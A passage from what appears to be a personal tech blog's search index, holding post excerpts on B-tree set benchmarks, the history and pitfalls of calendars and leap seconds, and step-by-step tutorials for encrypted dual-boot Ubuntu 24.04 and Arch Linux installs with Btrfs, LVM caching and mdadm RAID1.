we’ll use fixed-size arrays, each with exactly 32 bytes; they’re ordered by strncmp and hashed by a 32-bit FNV-1a function (in the previous experiments, we were relying on each language’s built-in ordering and hashing functions for integers).   In these benchmarks, I expected cache locality to play a smaller role, since fewer elements can fit in the cache now – our B-tree probably won’t get the same speedups it did before. To my surprise, the performance of C++’s std::unordered_set completely broke down with this bigger element type, to the point where I gave up on measuring its performance for any \\(n &gt; 10,000\\). I’m not sure what’s happening, but std::unordered_set behaves linearly when holding elements with 24+ bytes, and this is reproducible with clang as well.     After removing the problematic std::unordered_set&lt;String32&gt;, our results (disappointingly) match my expectations, with the performance of eris.btree falling behind the AA implementation, and getting closer to (albeit still faster than) the other tree-based sets.           Here’s another speedup table for our B-tree at \\(n = 2^{20}\\):                  container / operation       upsert       lookupFind       lookupFail       remove                       AA-as-set       0.35x       0.20x       0.16x       0.17x                 std::set       1.73x       1.77x       1.51x       1.59x                 std.container.rbtree       1.37x       0.98x       1.57x       1.22x           Checking Assumptions   As I explained previously, I’m estimating time by picking the minimum measurement across 30 repetitions of each experiment. This might be surprising for some of you, who would have expected a report of average timing instead. I did some research on benchmarking techniques, and professional teams seem to prefer percentiles when measuring application performance. This is because most benchmark results don’t actually follow normal distributions, where mean and standard deviation would do the job.   Since we already have the data for that, we can perform a simple normality test to check whether we should have used the mean instead. For each of our parameterized experiments, we collect minimum, maximum, mean and the standard deviation of our 30 measurements. With these, we can compute the z-score of our extrema, and compare that to the 68-95-99.7 (a.k.a the \\(1\\sigma-2\\sigma-3\\sigma\\)) rule.     As we can see, there are many \\(3\\sigma\\) (and even \\(4\\sigma\\)) events in our maximum measurements. These imply that modeling our performance with a normal distribution would lead us to underestimate how much deviation there really is in our measurements. At that point, average elapsed time is not as meaningful, and, since I’m lazy, I didn’t want to implement a more advanced statistics collector.   What’s Next   For now, I’m satisfied with the performance my custom B-tree set was able to achieve. My next step is probably going to be improving its API before making it open-source.   As for further benchmarks, we could try exploring other payloads. Due to the uniform distribution of our inputs, hash sets have the upper hand. It would be interesting to test how well that performance stands up to less-than-ideal hash distributions.   At some point, I’ll also try to make a faster hash table in D (and make it -betterC compatible, of course). When I do, I’ll add it to these benchmarks as well, and maybe the next time I’ll be using the P50 percentile (the median), since now I have an efficient ordered set data structure which I can use to compute percentiles: eris.btree.  ","categories": ["experiment"],
        "tags": ["algorithms"],
        "url": "/experiment/d-sets-btree/",
        "teaser": "/assets/images/eris/sets-upsert-int.png"
      },{
        "title": "Time is a Lie",
        "excerpt":"In order to measure time, we need some periodic event to use as a time unit. Then, if we can order two events one after the other, we can count elapsed time units between them. That’s enough to measure relative time, but if two or more systems want to share timing information about events which were not observed by all participants, they also need a fixed frame of reference, an epoch. For example, take two arbitrary events A and B, then count N units between them; what time was it when A happened? With the information at hand, the best answer you can give is that A happened N units before B. Then, what time was it when B happened? N units after A, of course. If I didn’t observe neither A or B, that answer might be completely useless to me.   If you think the previous example is unrealistic, you probably haven’t tried to read Linux dmesg logs. By default, dmesg adds a timestamp to each kernel message, and this timestamp is measured in terms of uptime, i.e., seconds since kernel startup. If a user doesn’t know when the system was last turned on, it is impossible to answer things like “was this kernel warning issued in the last week?” unless you have also registered the start/end of the week using these timestamps, or you know for sure there was no reboot in the last week (to make things worse, uptime does not tick while the system is sleeping or hibernating, so you would also have to take standby time into account).   We could even use these requirements to synthesize a formal definition of a calendar. I won’t bother, however, because as you’ll see, dealing with time and human calendars is incredibly complex. If you’ve ever seen (or maybe written) code like this:  days = wholeMonths*30 + wholeYears*365 timeInSeconds = days * 24 * 60 * 60 createAlert(now() + timeInSeconds)  Then you probably knew, deep down, that it was imprecise. But how bad can it get, really? That calculation assumes:     Every month has 30 days.   Every year has 365 days.   Every day has \\(24 \\times 60 \\times 60\\) seconds.   The truth is that every single one of these assumptions is wrong.   Ancient Lunisolar Calendars   One of the first periodic events we could observe was the cycle of day and night. So the primitive man decided to use days as a base time unit, and to this days we’re paying for that decision while trying to maintain backwards compatibility to some extent.   Of course, the primitive man wasn’t that good with big numbers, and eventually chose a more coarsely-granular time scale: eras following lunar and/or solar cycles. Meanwhile, their time anchors were based on political events, such as the crowning of a new ruler. Using these systems, we can imagine someone referring to a specific day as “the 3rd day of the 200th crescent moon of the 11th Dynasty”.   Unfortunately, these astronomical events which guide our calendars don’t repeat on an integer number of days. Still, we kept the day as a base time unit and decided that months and years must have a whole number of days. As a result, we have to make our calendars slightly irregular in order to compensate the frequency difference between astronomical and civil calendars. These drift-compensation mechanisms are called intercalary seconds/days/weeks/months.   For example: if the lunar month had a period of exactly 29.5 days, and we alternated between 29 and 30 -day calendar months, these would be in sync with a maximum error of \\(\\pm 0.5\\) days. Then, in order to compute how long to wait until “this day next month”, we would need to take that into account:  days = currentMonth.isEven ? 30 : 29; timeInSeconds = days * 24 * 60 * 60;  But is the moon really that important, to the point where we need to change our calendar in order to keep them in sync? Probably not, but the sun apparently is.   Leap Days and the Gregorian Reform   We’re all familiar with leap (or bissextile) years: every four years or so, the year has 366 days instead of the usual 365, and February ends on the 29th instead of the 28th. This intercalary event happens because we want our civil calendar to have a whole number of days each year, while keeping it in sync with the solar calendar. Unfortunately, the cosmos doesn’t care about integers nearly as much as we do, and the period of Earth’s revolution around the sun is approximately 365.2422 days (365 full days plus ~5.8128 hours). This difference would cause the calendar year to drift over time with respect to certain astronomical events, notably seasons.   If we round the period difference between solar and calendar years from ~5.8128 to 6 hours, then adding an extra day to our calendars every four years would be enough to fix this drift precisely, and seasons would be off by at most 18 hours. Since the period offset is actually smaller than 6 hours, doing this every four years would lead to an overcompensation. This is precisely how the Julian calendar worked (or, how it didn’t work).   Currently, most of the world uses the Gregorian calendar, which was introduced in 1582 A.D. as a substitute to the Julian Calendar. Before the Gregorian calendar was established, the Julian calendar had been running since 45 B.C., using excessive leap years. This led to an offset (w.r.t. the solar year) of approximately 10 days, all of which were adjusted at once: in 1582, the next day after October 4 (a Thursday) was October 15 (a Friday). After that point, we’ve been skipping leap years (we don’t add the leap day) on years which are multiples of 100 and not multiples of 400. In the end, our maximum error with respect to seasonal events is approximately 2 days, and an era in the Gregorian calendar (a full period, taking leap days into account) is 400 years long.   The Julian-Gregorian transition doesn’t make time calculations any more complicated if you pretend the Gregorian calendar had always been in effect; in which case you would be using the proleptic Gregorian calendar. Unfortunately, you might be surprised by date and time libraries trying to be smart about it. Java is a notable example, as converting a java.util.Date to a string will use a default-parameter GregorianCalendar. Despite the name, that implementation actually switches between Gregorian and Julian calendars when going across the transition, so these strings might lead to time calculations which are off by 10 days.   ISO 8601 and Leap Seconds   Nowadays, we have standard representations / interchange formats for time and dates. ISO 8601 was first introduced in 1988, and it has some nice features:      Fixes the proleptic Gregorian calendar as an international standard for civil dates.   Lexicographical order of the representation corresponds to chronological order.   Robust applications can easily parse dates with higher-than-needed precision.   Unfortunately, we’re still left with a couple of problems, mostly artifacts from the past.   When the day was used as a base time unit, we needed to compensate calendars based on units bigger than that, and anything smaller was simply defined as a fraction of a day. So, in the past, the second was defined to be \\(\\frac{1}{24 \\times 60 \\times 60} = \\frac{1}{86400}\\) of a day. Currently, in the S.I., seconds are the base time unit, where 1 second is defined as “the duration of 9,192,631,770 periods of the radiation corresponding to the transition between the two hyperfine levels of the ground state of the caesium-133 atom”. If we ignore relativistic frequency shifts, that’s pretty much a constant, and TAI is a time standard which tracks time based on a monotonic clock, ticking precisely every second and centered around the Unix epoch 1970-01-01T00:00:00Z. Unfortunately, now that our base unit became smaller, solar time and civil time start differing, and calendar days need drift compensation as well.   UT1 is a time standard which tracks the Earth’s rotation angle, also known as solar time. However, the Earth spins irregularly, and the length of a day has been slowly increasing for the past centuries (this is apparently caused in part by the moon). This means that UT1 (solar time) and TAI (atomic time) are drifting apart. Now, what we actually use to coordinate time worldwide is the UTC standard, which we decided would have seconds elapsing at the same rate as TAI, all while keeping it’s offset to UT1 to less than a second. In this case, drift compensation is done by adding a leap second every now and then.   Unlike leap days, however, the addition of leap seconds to UTC does not follow a regular schedule. When it does happen, the last minute of the day goes from 00 to 60 (and this is compatible with ISO 8601), for a total of 61 seconds in that minute. As of 2023, UTC is 37 seconds behind TAI, and the next scheduled leap second will be advertised in “Bulletin C”.   Conclusion   Remember our initial assumptions?      Every month has 30 days.   Every year has 365 days.   Every day has \\(24 \\times 60 \\times 60\\) seconds.   I’m sure you knew the first one was wrong already, since you’re used to the Gregorian calendar.   The second is also common knowledge, but we often forget about leap days.   The third is false in both UT1 and UTC, since days are getting longer, and every now and then we have a leap second to account for.   Furthermore, we can’t even refer to specific times in the past or future:     In ISO 8601, dates before 1582-10-15 can only be transmitted after mutual agreement of the parts exchanging information; this is done in order to avoid ambiguities and confusion related to the Julian-Gregorian transition.   The fact that we can’t predict the addition of leap seconds to UTC makes it impossible to reference precise date-times in the future.   In reality, the best we could do would probably be to forget about days, months and years altogether; use the Unix epoch as a reference, and atomic clocks to make sure frequency doesn’t drift away from the standard second. Although this is feasible when we’re talking about computer systems, I’m not sure it will ever catch on.   In the end, UTC is the best we currently have for civil time, even if it is a lie.  ","categories": ["rant"],
        "tags": ["timing"],
        "url": "/rant/time-is-a-lie/",
        "teaser": "/assets/images/aigen-perchance-analogclock.jpg"
      },{
        "title": "How to set up separately-encrypted dual-booting Linux systems on hybrid storage",
        "excerpt":"It’s time to rebuild my computer setup. This series of blog posts will document how I did it, mainly as documentation for my own reference in case I need to re-build anything in the future, but hopefully it helps someone else out there with similar needs.   Some context   I’ve been using the same Dell laptop for the past ~7 years and have gone through:     Multiple update-revert cycles on top of the original Windows-only setup   Resizing Windows partitions in order to dual-boot Manjaro Linux   Upgrades in phyiscal memory, a battery swap and a new SSD   Deleting Manjaro from the HDD while distro-hopping to System76’s Pop!_OS Linux   Corrupting data in the older HDD because of a power loss while moving partitions   Restoring said data (phew!) from my Borg backups   Fully abandoning Windows, yet keeping it installed in the HDD “just in case”          xkcd #1360        Since my new job requires me to use a specific OS, I figured that this would be a good opportunity to start from scratch in order to make better use of the hardware I have. I’ll keep using the same laptop, of course, since it still works well and is powerful enough for all my needs (including gaming from time to time).   My hardware specs. are:     A Dell motherboard/firmware with support for UEFI boot   An Intel x86-64 processor with integrated graphics   A discrete Nvidia GPU with 4 GiB VRAM   16 GiB DDR3 phyiscal memory   An old 5400 RPM HDD with ~1 TB capacity   A newer M.2 2280 SSD with ~480 GB capacity   What I need/want from the resulting system is:     A standard Ubuntu 24.04 LTS install (+encryption), for work   A fully-custom Arch Linux system, for personal use   Be able to quickly (re)boot and choose an(other) OS for the occasion   Security for both personal and work-related data   Make good use of my hardware, especially the SSD and GPU   Get the most out of my laptop’s battery life, when unplugged   Additionally:     My HDD is pretty old at this point (in use for 7+ years!), so I have to assume that it may start failing at any moment.   On the other hand, I’ve heard some horror stories about SSD sudden death, so I want to be prepared for failures there as well.   I’m not worried about cutomizing my work OS that much, so a fresh reinstall shouldn’t be much of an issue.   Furthermore, I expect work-related storage to be mostly build artifacts and caches, which can always be recovered through a clean build from the (version-controlled, cloud-backed) sources.   I probably don’t need more than 400 GiB for my personal data + OS, at least based on usage in my current setup.   A first sketch   After doing some research and a few VM tests, here’s what I want the system to look like, at a high level:    A few things to note:     There’s a single ESP partition on the system.            According to this, the UEFI specification does not require support for multiple ESPs.       This partiton has to formatted as FAT32.           Each OS gets its own unencrypted /boot partition.            They are unencrypted because most bootloaders don’t support encryption. GRUB is a bit of an exception, but it still doesn’t support default LUKS2 encryption.       Each OS gets to manage its own boot partition, reducing the chances that they’ll mess up each other’s boot.       Both boot partitions will be formatted using ext4. This is how Ubuntu’s 24.04 installer does it, and how I chose to do it (as opposed to using ext2) after reading this.           Personal stuff, work stuff and backups are all separately encrypted.            This is for added security: a compromised user/service in the work OS won’t be able to steal my personal data and vice-versa.           Most of the SSD is filled with personal stuff            This is needed in order for me to fit everything I have in the SSD. I don’t want to lose my files if/when the HDD fails.       Even if the SSD fails, the RAID1 mirror ensures that I’ll be able to reboot and continue working on my own personal stuff on a short notice (NOTE: this does NOT substitue external backups).                    If that happens, it should be pretty straightforward to disable RAID1.                       Booting from the HDD mirror in case of an SSD failure will require me to have (a) ESP and /boot backups in the last HDD partition and (b) a live ISO which I can boot from and restore those partitions.           The work installation will be split between SSD and HDD.            This is because most of the SSD storage is taken by personal stuff.       If the HDD fails, I’ll lose some build artifacts / caches but will still be able to keep working in the storage-constrained environment of the SSD.       If the SSD fails, I can just reinstall the OS from scratch in the reserved HDD space.           Lack of any swap partitions.            On a fully-encrypted system, it seems that swap files will be easier to manage than swap partitions.           Btrfs vs LVM-ext4   LUKS appears to be the current standard for disk encryption on Linux dm-crypt. It works by creating a “virtual” block device over an existing one and transparently translating reads and writes to read+decrypt and encrypt+write operations.   By default, each encrypted device must be unlocked separately, which can be annoying for multi-partition systems. Therefore, most people recommend setting up a flexible filesystem on top of LUKS in order to have a single unlock for all logical partitions needed by the system. Ubuntu’s 24.04 installer uses ext4 partitions on top of LVM on top of LUKS, whereas my current Pop!_OS system was set up with Btrfs on top of LVM on top of LUKS.          LVM diagram, by Troy Curtis Jr from the Fedora Magazine.        While LVM and Btrfs are not mutually exclusive, they have similar features:     Volume management: both can distribute storage across multiple devices, but in LVM you have to manually resize logical volumes.   Snapshots: both can create (sub)volume snapshots for backups, but I think Btrfs’s are faster because of CoW.   RAID: both provide support for RAID, but Btrfs’ is less mature.   Compression: Btrfs has transparent compression and deduplication.   Caching: Btrfs does not have an equivalent of LVM’s lvmcache for hybrid storage, unless you count hybrid RAID1 (but that requires equal-sized block devices).   While I’ll keep the default LUKS -&gt; LVM -&gt; ext4 used in Ubuntu 24.04, I’ll set up Btrfs on Arch because:     I don’t want to explicitly resize subvolumes.   Arch is a rolling release distro, so I’ll want fast snapshots on every update.   I want a RAID1 solution that works under LUKS (such as mdadm), not on top of it, so I wouldn’t be using LVM or Btrfs for their RAID features anyway.   Btrfs’s compression and deduplication should help reduce SSD disk usage.   I don’t need a hybrid storage cache for the Arch system, since it will fit entirely in the SSD.   Since I’ll have my personal stuff on top of Btrfs, I might as well use it in the HDD backup partition. That will allow me to use Btrfs’s send/receive operations in order to easily move local snapshots to the HDD, and then later from the HDD to an external backup device.   With that in mind, here’s how I expect my personal OS to look like after booting:      lvmcache vs bcache   I’m going to reserve 100 GiB in the SSD for my work system. Depending on the development tools I use, I know that’s not going to be enough storage, in which case I’ll need to store data in the (5x slower) HDD as well.   Setups like this are pretty common nowadays: just keep your base OS installed in the SSD, while large(r) files go in the slower HDD. Since frequent access to large files could also benefit from SSD speed ups, some people will go the extra mile and move hot data to the SSD, then place them back on the HDD when they’re no longer being used that often.   The thing is: I don’t want to do that kind of optimization manually, transferring files back and forth between disks. This is precisely why I’m interested in setting up a hybrid storage solution, in which the SSD acts as a cache to the HDD.   It seems that the standard options for doing this on Linux are lvmcache and bcache. Here’s a few points I gathered while researching those technologies:     lvmcache runs on top of LVM, which I’ll already be using in the Ubuntu install.   LVM snapshots are not possible on a cached volume; that’s OK for me but could be a deal breaker for others.   In an encrypted system, bcache should sit between LUKS and the file system, and I don’t see how to do that without deviating from the standard Ubuntu 24.04 encrypted install.   A few comments on Reddit and a specific blog post convinced me that bcache had many issues back in 2020-2021; I’m not sure if those were fixed since then.   On the other hand, I see people happily using lvmcache in 2022.   In case it wasn’t obvious, I’ll be going with lvmcache for my work OS:      Next steps   Of course, the next step is actually implementing these designs.   I’ll set up everything in a VM first and document how I did it in the next few blog posts. Then, if everything works, I’ll apply it to my actual machine.   See you in the next part!   Appendix A - SSD vs HDD speeds   I wanted to understand just how faster my M.2 2280 SSD was over my old 5400 RPM HDD, so I ran a few tests using hdparm and gnome-disk-utility.   I started by carving out 2 GiB partitions from the free space on each drive:     /dev/sda2 is on the SSD   /dev/sdb7 is on the HDD   Running the default GNOME Disks R/W benchmark on the unformatted partitions yields the following results (read rates can be confirmed by a few runs of hdparm -t):                  Device       Average Read Rate       Average Write Rate                       SSD       540.8 MB/s       457.8 MB/s                 HDD       112.1 MB/s       93.2 MB/s                     Appendix B - mdadm vs Btrfs for hybrid (SSD+HDD) RAID1   While mdadm is the default option for software RAID on Linux, I found out that Btrfs supports RAID1 natively. Therefore, I could choose between the following stacks for my personal OS:     mdadm RAID1 -&gt; LUKS -&gt; Btrfs  |   LUKS -&gt; Btrfs with RAID1                                 | SSD: [ mdadm | LUKS | Btrfs ]   |  SSD: [  LUKS  |  Btrfs  ]          |                      |                     |          | RAID1 mirroring      |                     | RAID1 mirroring          v                      |                     v HHD: [ mdadm | LUKS | Btrfs ]   |  HDD: [  LUKS  |  Btrfs  ]   If I wasn’t using disk encryption, I might have gone with the simpler Btrfs-only stack. However, since Btrfs sits on top of LUKS, RAID1 would only kick in after both partitions were decrypted.   Another issue is performance on a hybrid storage setup: according to this answer, “the btrfs raid 1 disk access algorithms work by reading from one disk for even-numbered PIDs, and the other for odd-numbered PIDs”. In other words: disk access speed will suck for half of your processes. Online discussions pointed me to the source code, which does appear to be distributing reads based on PIDs as per a BTRFS_READ_POLICY_PID.   In conclusion: I’ll forget about Btrfs RAID1 for now. Maybe in the future, when it provides a better RAID1 access distribution policy (and maybe native encryption, I’ve heard that’s on the roadmap), I’ll consider it again for a setup like mine.  ","categories": ["tutorial"],
        "tags": ["linux"],
        "url": "/tutorial/dual-boot-linux-encrypted-hybrid-storage/",
        "teaser": "/assets/images/dual-boot/drives.png"
      },{
        "title": "How to install Ubuntu 24.04 LTS with Full Disk Encryption",
        "excerpt":"Ubuntu 24.04 LTS, code name “Noble Numbat”, was released just 3 weeks ago. The new installer doesn’t make it obvious, but you can have an encrypted install without erasing / using the entire disk. Here’s how to do it.   1. Acquire installation media      Download the official ISO image;   Make sure its sha256sum matches the expected hash (81fae9cc21e2b1e3a9a4526c7dad3131b668e346c580702235ad4d02645d9455 for 24.04);   Flash the image on a USB stick;   2. Prepare the target system      Back up your data;   Boot your computer from the live USB;   Close the installer in order to see the system’s desktop;   Delete or shrink existing partitions in order to make space for Ubuntu:            In simple setups, this can be done using GParted or fdisk       More advanced setups require extra steps (e.g; resizing encrypted partitions is tricky)           Consider using a secure erasing process in case your drive wasn’t encrypted before;   If there’s any disk space you DON’T WANT Ubuntu to occupy, just make sure the installer doesn’t see it as free space by creating dummy partitions there;   Partition layout   Based on my VM tests, here’s how the automated installer lays out partitions:     If an ESP partition already exists, it will be used by Ubuntu as well;   Otherwise, a new one is created in the first sector range of the disk with enough free space for it (default size appears to be 1075 MiB);   Then, it chooses another disk chunk to set up a boot partition and a root partition:            I’m not sure whether it uses the first free range which can fit the OS, or the biggest such range that it can find;       Either way, the two partitions are laid out one after the other; where the first 1792 MiB are used by the boot partition and everything else is given to the root partition.           In my case, I’ve carved out the first 4 GiB and the last 10 GiB as free space. The remaining disk space between those was reserved by two partitions which I’ll use to install Arch afterwards.   3. Guided encrypted install      Re-open the installer and follow the wizard until you get to the disk setup page:          The new installer doesn’t make it obvious, but you can have an encrypted install without erasing the entire disk.           Toggle the “Erase disk” option, just for now;   Go to the “Advanced features” menu and select “Use LVM and encryption”;          This tells the installer to encrypt the root partition using LVM on top of LUKS.           If you don’t want to erase the entire disk, make sure to toggle the “Install Ubuntu alongside other partitions” option before continuing;          Can you see the difference between this screenshot and the first one?           If encryption was indeed enabled, you’ll be prompted for a password in the next page:          Password prompt for LUKS encryption.           Keep following the install wizard until it asks you to review your choices;          Notice that LUKS disk encryption is enabled.           After confirming that everything is as expected, let the installer do its thing;          Disk layout after the installer is done. All three ext2 partitions were created to reserve that disk space for another OS.        4. Reboot      When rebooting into your fresh Ubuntu installation (and on every boot from now on), you’ll be asked for the encryption password used during installation:          Here’s how it looks like when booting in a VirtualBox VM.        Appendix - How to fix installation failure on a VM with low memory   If the installation doesn’t finish successfully (and you’re testing it in a VM):     Take a look at this bug report   Increase the amount of memory assigned to the VM            (I got this error when using 4 GiB, but 8 GiB worked fine)          ","categories": ["tutorial"],
        "tags": ["linux"],
        "url": "/tutorial/ubuntu-24.04-encrypted/",
        "teaser": "/assets/images/dual-boot/ubuntu-boot-encrypted.png"
      },{
        "title": "How to install Arch on Btrfs with LUKS encryption and software RAID1",
        "excerpt":"This tutorial is written for my own future reference, but I’m also posting it online in case it helps someone else looking for a similar setup. While the first post on this series already laid out my specs, motivations and technological choices, this one will focus on implementing the core parts of my personal subsystem: an encrypted Arch Linux installation on top of Btrfs, with RAID1.   0. Overview   Here’s a sketch of what I’m aiming for:      During the previous part of this series, I’ve used the Ubuntu 24.04 LTS guided installer to create an ESP partition (sda1, in green) and the core parts of my work subsystem (sda4 and sda5, in orange). This post will set up the remaining SSD partitions, as well as the HDD RAID1 mirror.   I’ll follow the general structure of the Arch wiki’s installation guide, with a few added comments and highlighting deviations from the standard route for my customizations.   1. Pre-installation   1.1. Acquire an installation image   Just download the latest ISO image from the official Arch download page.   1.2. Verify image hashes   Make sure the ISO’s sha256sum matches the expected hash (1b4a04ef8a7350852a13070ee498442b087a607a18840b4dd7d99867eb5f6a4c for 2024.05.01).   1.3. Prepare installation medium   Flash the image on a USB stick.   1.4. Boot the live environment   You’ll find yourself logged as root in a Zsh shell. These pacakges come pre-installed.          Arch install live environment, after a few sanity checks.        1.5. Set the console keyboard   Nothing to do here, since I use a US keyboard layout.   1.6. Verify the boot mode   cat /sys/firmware/efi/fw_platform_size should read 64.   1.7. Connect to the internet   Just use ethernet. The live system connects automatically using DHCP.   Make sure your connection is actually working by pinging an external server.   1.8. Update the system clock   Check if the output of timedatectl looks sane (in UTC+0).   1.9. Partition the disks   This is where it gets interesting. I already know how I want to partition my disks, but here are a few highlights copied straight from the Arch wiki:           Take time to plan a long-term partitioning scheme to avoid risky and complicated conversion or re-partitioning procedures in the future.      Done.           The following partitions are required for a chosen device: one partition for the root directory /; for booting in UEFI mode: an EFI system partition.     If the disk from which you want to boot already has an EFI system partition, do not create another one, but use the existing partition instead.     Swap space can be set on a swap file for file systems supporting it.      We already have an EFI partition created by the Ubuntu installer, so we’ll keep using that. Then, instead of a single root partition mounted at /, we’ll create separate root (/) and boot (/boot/) partitions, since we want the former to be encrypted (and the latter can’t be, depending on the second-stage boot loader we end up using). Finally, if swap is needed at all I’ll just use a swap file, since that’s supported on our filesystem of choice, Btrfs.      Aligning partitions correctly avoids excessive read-modify-write cycles. A typical practice for personal computers is to have each partition’s start and size aligned to 1 MiB (1 048 576 bytes) marks. This covers all common page and block size scenarios, as it is divisible by all commonly used sizes - 1 MiB, 512 KiB, 128 KiB, 4 KiB, and 512 B. Warning: Misaligned partitions will prevent being able to use 4096 B sectors with LUKS.    This important disk performance tip was hidden away in the Advanced Format page. Even though most disk partitioning tools default to MiB alignment, I think this should be highlighted in the partitioning step of the installation guide.      If you want to create any stacked block devices for LVM, encryption or RAID, do it now.    1.9.1. Securely erasing a drive   I’m going to err on the side of caution and securely erase my entire HDD:   wipefs -a /dev/sdb cryptsetup open --type plain -d /dev/urandom --sector-size 4096 --cipher aes-xts-plain64:sha256 --key-size 256 /dev/sdb to_be_wiped dd if=/dev/zero of=/dev/mapper/to_be_wiped status=progress bs=1M cryptsetup close to_be_wiped   Here I’ve manually specified the fastest (according to a cryptsetup benchmark) combination of cipher and key size, as well as the physical sector size of my HDD (obtained with lsblk -t).   1.9.2. Physical partitioning   This is what our disks looked like after our encrypted Ubuntu 24.04 installation:          Disk layout after the Ubuntu install. sda is an SSD and sdb a bigger HDD.        Everything on the SSD is already MiB aligned. You can check that manually by running fdisk -l and making sure the start sector and total sectors assigned to each partition are divisible by 8. Then, I’ll just wipe the placeholder ext2 file systems which I used to “hide” available disk space from the Ubuntu installer:   wipefs -a /dev/sda2 wipefs -a /dev/sda3   As for the just-erased HDD, I’ll use fdisk’s interactive shell to:     Set up a fresh GPT partition table (g)   Create a new partition the exact same size of /dev/sda3 (n)   Commit my changes (w)   1.9.3. RAID on hybrid storage   We’ll now set up software RAID1 using mdadm. In my particular case, I’ll have a hybrid RAID1 setup: one of the mirrors is in an SSD, while the other is in an HDD. Thankfully, mdadm has a “write-mostly” flag which can mark expected-to-be-slower devices (/dev/sdb) in the array in order to make most reads come from the faster device (/dev/sda). Setting it up is as simple as:   mdadm --verbose --create --metadata=0.90 /dev/md0 --level=1 --raid-devices=2 /dev/sda3 --write-mostly /dev/sdb1   Before continuing, watch /proc/mdstat to make sure the array had enough time to resync.          Setting up software RAID on Linux is easier than I imagined.        1.9.4. LUKS encryption   Setting up dm-crypt / LUKS encryption on top of a RAID1 array is also quite simple:   cryptsetup -v luksFormat /dev/md0 cryptsetup open --allow-discards /dev/md0 arch-root          Save for discards, the default LUKS settings in this version of cryptsetup are exactly what I want for this particular system.        1.10. Format the partitions   As planned, I’ll use ext4 for my boot partition and Btrfs (on LUKS, on RAID) for the rest:   mkfs.ext4 /dev/sda2 mkfs.btrfs /dev/mapper/arch-root   1.11. Mount the file systems   I’ll start by temporarily mounting my Btrfs root at /mnt.   mount -o defaults,compress=zstd:1,ssd,discard=async,noatime /dev/mapper/arch-root /mnt      Compression is one of the reasons I chose Btrfs, and after looking at a few benchmarks, it seems that zstd:1 is the best compromise on compression ratio and CPU usage.   Apparently, Btrfs does not add ssd or discard options by default when it is mounted on top of LUKS/RAID, so I’ll add those manually.   Finally, I use noatime in order to avoid unnecessary writes on the hybrid RAID1 setup, since they’ll have HDD speeds and I want to preserve SSD read performance.   Now, since the filesystem is empty, this is probably the most convenient moment to set up other Btrfs subvolumes. I’ll follow the suggested filesystem layout for Snapper, with separate subvolumes @ and @home for / and /home respectively, then @var_log to exclude /var/log from root snapshots (note: I may have to create more subvolumes in the future in order to have separately-snapshottable containers, databases, and the like).   btrfs subvolume create /mnt/@ btrfs subvolume create /mnt/@home btrfs subvolume create /mnt/@var_log   Now, in order to actually use the @ subvolume as our / mountpoint (as opposed to mounting / directly on the root subvolume a.k.a. subvolid=5), we’ll unmount the current root:   umount /mnt   And then set up mountpoints (subvolumes and normal partitions alike) in the way they’re actually going to be used in the installed system, in hierarchical order:   mount -o subvol=@,defaults,compress=zstd:1,ssd,discard=async,noatime /dev/mapper/arch-root /mnt/  mkdir -p /mnt/home mount -o subvol=@home,defaults,compress-force=zstd:1,ssd,discard=async,noatime /dev/mapper/arch-root /mnt/home  mkdir -p /mnt/var/log mount -o subvol=@var_log,defaults,compress=zstd:1,ssd,discard=async /dev/mapper/arch-root /mnt/var/log  mkdir -p /mnt/boot mount /dev/sda2 /mnt/boot  mkdir -p /mnt/boot/efi mount /dev/sda1 /mnt/boot/efi          Setting up mount points for subvolumes and partitions alike.        2. Installation   2.1. Select the mirrors   reflector -p https -l 100 --sort rate -n 20 --save /etc/pacman.d/mirrorlist   2.2. Install essential packages   This is where we decide what packages we want in our initial install:   pacstrap -K /mnt \\   base sudo systemd less which lsof \\   linux-zen linux linux-firmware \\   intel-ucode \\   e2fsprogs dosfstools cryptsetup lvm2 mdadm btrfs-progs \\   networkmanager bind whois wget curl \\   nano vim \\   man-db man-pages \\   refind efibootmgr mkinitcpio \\   base-devel cmake git python gnupg openssh diffutils \\   bash-completion htop tree xxd dmidecode usbutils perl-image-exiftool sysstat bat inxi   3. Configure the system   3.0. Update RAID config file   Since we’re using RAID, we need to update the default mdadm configuration file:   mdadm --detail --scan &gt;&gt; /mnt/etc/mdadm.conf   Then open it on a text editor to make sure it looks OK.   3.1. Fstab   Similarly, for the fstab file:   genfstab -U /mnt &gt;&gt; /mnt/etc/fstab   3.2. Chroot   Now, we’ll be chrooting into the new system:   arch-chroot /mnt   3.3. Time   If you want the system’s local time to be in your own timezone instead of UTC:   ln -sf /usr/share/zoneinfo/$REGION/$CITY /etc/localtime hwclock --systohc   3.4. Localization   Edit /etc/locale.gen and uncomment en_US.UTF-8 UTF-8, as well as any other needed UTF-8 locales. Then, generate the locales and set the system locale with:   locale-gen echo 'LANG=en_US.UTF-8' &gt; /etc/locale.conf   3.5. Network configuration   Create a hostname file:   echo 'my-cool-hostname' &gt; /etc/hostname   And, in my case, I’ll manually enable the NetworkManager systemd unit:   ln -s /usr/lib/systemd/system/NetworkManager.service /etc/systemd/system/multi-user.target.wants/   3.6. Initramfs   In this setup, where I’m using LUKS encryption and software RAID, I needed to add mdadm_udev and encrypt to my initramfs hooks in /etc/mkinitcpio.conf:   HOOKS=(base udev autodetect microcode modconf kms keyboard keymap consolefont block mdadm_udev encrypt filesystems fsck)   Then, in order to actually apply these changes and recreate the initramfs image:   mkinitcpio -P          Note: the mkinitcpio command may issue some warnings while generating the initramfs; I just ignored the ones I got.        3.7. Root password   We can then set the root password with passwd.   3.8. Boot loader   In my case, I’ll use rEFInd (which I already installed in the pacstrap command):   refind-install rm /boot/refind_linux.conf cp /boot/efi/EFI/refind/refind.conf /boot/efi/EFI/refind/refind.conf.bak   After creating a backup of the original config, I edited /boot/efi/EFI/refind/refind.conf to reduce the boot timeout, to add support for the naming scheme of Arch Linux kernels and to enable the inclusion of a separate manual.conf config file.   # refind.conf ... timeout 5 ... extra_kernel_version_strings \"linux-hardened,linux-rt-lts,linux-zen,linux-lts,linux-rt,linux\" ... include manual.conf   Then, I like to set up a manual boot stanza in /boot/efi/EFI/refind/manual.conf, which reads:   # manual.conf menuentry \"Arch Linux\" { \ticon    /EFI/refind/icons/os_arch.png \tvolume  \"8B2310D6-C36B-4FB9-929B-F2FF5D5B120D\" \tloader  /vmlinuz-linux-zen \tinitrd  /initramfs-linux-zen.img \toptions \"cryptdevice=UUID=6fd4672b-5745-404d-a4f2-5cf3984c0ae5:arch-root:allow-discards root=UUID=07a47b01-b163-4e7f-99ab-4c6310c4e4a1 rootflags=subvol=@ rw\" \tsubmenuentry \"Boot using fallback initramfs\" { \t\tinitrd /initramfs-linux-zen-fallback.img \t} }      We need to specify the icon token before choosing a boot volume.   The 